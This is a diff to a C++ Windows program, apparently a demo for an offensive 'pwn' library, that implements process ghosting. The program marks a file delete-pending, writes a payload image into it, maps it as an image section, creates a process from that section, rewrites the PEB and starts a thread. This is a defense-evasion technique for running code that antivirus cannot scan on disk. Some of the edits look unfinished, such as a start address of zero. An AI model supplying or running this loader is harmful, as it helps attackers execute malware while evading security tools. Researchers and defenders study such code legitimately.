@@ -17,17 +17,18 @@ using namespace pwn;
 auto
 wmain(const int argc, const wchar_t** argv) -> int
 {
-    Context.LogLevel = Log::LogLevel::Debug;
+    Context.Set(Log::LogLevel::Debug);
 
     //
-    // By default, the program will execute `explorer.exe` as the ghost process of `ghost.exe`
+    // By default, the program will execute `winver.exe` as the ghost process of `ghost.exe`
     //
-
-    const auto GhostProcessPath =
-        (argc >= 2) ? std::filesystem::path(argv[1]) : std::filesystem::path(L"C:\\Windows\\System32\\explorer.exe");
+    const auto GhostProcessPath = (argc >= 2) ? std::filesystem::path(argv[1]) :
+                                                std::filesystem::path(L"\\\\?\\C:\\Windows\\System32\\winver.exe");
 
     const auto GhostedProcessPath =
-        (argc >= 3) ? std::filesystem::path(argv[2]) : std::filesystem::path(L".\\ghost.exe");
+        (argc >= 3) ? std::filesystem::path(argv[2]) : std::filesystem::path(L"\\\\?\\c:\\temp\\ghost.exe");
+
+    dbg("Ghosting '{}' as '{}'", GhostProcessPath.string(), GhostedProcessPath.string());
 
 
     //
@@ -35,17 +36,22 @@ wmain(const int argc, const wchar_t** argv) -> int
     //
     auto GhostFile   = FileSystem::File(GhostedProcessPath);
     auto PayloadFile = FileSystem::File(GhostProcessPath);
+    if ( !GhostFile.IsValid() || !PayloadFile.IsValid() )
+    {
+        return EXIT_FAILURE;
+    }
 
 
     //
     // 2. Put the file into a delete-pending state using NtSetInformationFile(FileDispositionInformation). Note:
     // Attempting to use FILE_DELETE_ON_CLOSE instead will not delete the file.
     //
+    GhostFile.ReOpenFileWith(GENERIC_WRITE);
+
     FILE_DISPOSITION_INFORMATION fdi {};
     fdi.DeleteFile = true;
     if ( Failed(GhostFile.Set(FILE_INFORMATION_CLASS::FileDispositionInformation, fdi)) )
     {
-        err(" NtSetInformationFile(FileDispositionInformation) failed");
         return EXIT_FAILURE;
     }
 
@@ -56,8 +62,8 @@ wmain(const int argc, const wchar_t** argv) -> int
     //
     {
         auto const FileSize = ValueOr<usize>(PayloadFile.Size(), 0);
-        auto hMap           = UniqueHandle {Value(GhostFile.Map(PAGE_READONLY))};
-        auto View           = GhostFile.View(hMap.get(), 0, PAGE_READONLY, FileSize);
+        auto hMap           = UniqueHandle {Value(PayloadFile.Map(PAGE_READONLY))};
+        auto View           = PayloadFile.View(hMap.get(), FILE_MAP_READ, 0, FileSize);
         auto hView          = FileSystem::FileMapViewHandle {Value(View)};
         DWORD bytesWritten {};
         ::WriteFile(GhostFile.Handle(), hView.get(), FileSize, &bytesWritten, nullptr);
@@ -70,17 +76,21 @@ wmain(const int argc, const wchar_t** argv) -> int
     UniqueHandle hSection {
         [&GhostFile]() -> HANDLE
         {
-            HANDLE h;
-            return NT_SUCCESS(pwn::Resolver::ntdll::NtCreateSection(
-                       &h,
-                       SECTION_ALL_ACCESS,
-                       nullptr,
-                       nullptr,
-                       PAGE_EXECUTE_READ,
-                       SEC_IMAGE,
-                       GhostFile.Handle())) ?
-                       h :
-                       INVALID_HANDLE_VALUE;
+            HANDLE h {};
+            auto Status = pwn::Resolver::ntdll::NtCreateSection(
+                &h,
+                SECTION_ALL_ACCESS,
+                nullptr,
+                nullptr,
+                PAGE_READONLY,
+                SEC_IMAGE,
+                GhostFile.Handle());
+            if ( !NT_SUCCESS(Status) )
+            {
+                Log::ntperror("NtCreateSection", Status);
+                return nullptr;
+            }
+            return h;
         }()};
     if ( !hSection )
     {
@@ -88,7 +98,7 @@ wmain(const int argc, const wchar_t** argv) -> int
         return EXIT_FAILURE;
     }
 
-    ok("RX section opened as {}", hSection.get());
+    dbg("Section opened as {}", hSection.get());
 
 
     //
@@ -104,7 +114,7 @@ wmain(const int argc, const wchar_t** argv) -> int
         [&hSection]() -> HANDLE
         {
             HANDLE h;
-            return NT_SUCCESS(::NtCreateProcessEx(
+            return NT_SUCCESS(pwn::Resolver::ntdll::NtCreateProcessEx(
                        &h,
                        PROCESS_ALL_ACCESS,
                        nullptr,
@@ -115,9 +125,9 @@ wmain(const int argc, const wchar_t** argv) -> int
                        nullptr,
                        false)) ?
                        h :
-                       INVALID_HANDLE_VALUE;
+                       nullptr;
         }()};
-    if ( hProcess )
+    if ( !hProcess )
     {
         Log::perror("NtCreateProcessEx");
         return EXIT_FAILURE;
@@ -130,19 +140,18 @@ wmain(const int argc, const wchar_t** argv) -> int
     //
     // 7. Assign process arguments and environment variables.
     //
-    // auto res = GhostedProcess.Query<PROCESS_BASIC_INFORMATION>(PROCESSINFOCLASS::ProcessBasicInformation);
-    // TODO finish here
-    const auto Peb = GhostedProcess.ProcessEnvironmentBlock();
-    GhostedProcess.Memory.Write((uptr)Peb->ImageBaseAddress, Utils::Pack::p64(0x41414141'41414141));
-
-    ok("Overwritten PEB@{} in process PID={}", (uptr)Peb, GhostedProcess.ProcessId());
+    auto PebRaw = Value(GhostedProcess.Memory.Read((uptr)GhostedProcess.ProcessEnvironmentBlock(), sizeof(PEB)));
+    auto Peb    = reinterpret_cast<PEB*>(PebRaw.data());
+    Binary::PE PeTarget {GhostProcessPath};
+    Peb->ImageBaseAddress = (PVOID)((uptr)(PeTarget.Header().OptionalHeader.AddressOfEntryPoint));
+    GhostedProcess.Memory.Write((uptr)GhostedProcess.ProcessEnvironmentBlock(), PebRaw);
+    dbg("Overwriting PEB in process PID={}", GhostedProcess.ProcessId());
 
 
     //
     // 8. Create a thread to execute in the process.
     //
-    const uptr StartAddress = (uptr)GhostedProcess.ProcessEnvironmentBlock()->ImageBaseAddress;
-
+    const uptr StartAddress = 0;
     UniqueHandle hThread {
         [&hProcess, &StartAddress]() -> HANDLE
         {
@@ -160,7 +169,7 @@ wmain(const int argc, const wchar_t** argv) -> int
                        0,
                        nullptr)) ?
                        h :
-                       INVALID_HANDLE_VALUE;
+                       nullptr;
         }()};
     if ( hThread )
     {
